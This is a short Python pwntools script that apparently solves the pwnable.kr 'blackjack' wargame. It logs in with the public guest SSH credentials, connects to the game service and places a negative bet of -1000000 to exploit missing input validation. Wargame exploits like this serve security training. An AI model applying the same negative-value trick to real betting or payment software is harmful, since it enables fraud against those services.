from pwn import * 




ssh = ssh(user="blackjack",host="pwnable.kr",port=2222,password="guest")


sh = ssh.shell("nc 0 10010")


print(sh.recv().decode())
sh.sendline(b"Y")
print(sh.recv().decode())
sh.sendline(b"1")
print(sh.recv().decode())

sh.sendline(b"-1000000")
print(sh.recv().decode())
sh.sendline(b"S")
print(sh.recv().decode())
sh.sendline(b"Y")
print(sh.recv().decode())


sh.close()
ssh.close()
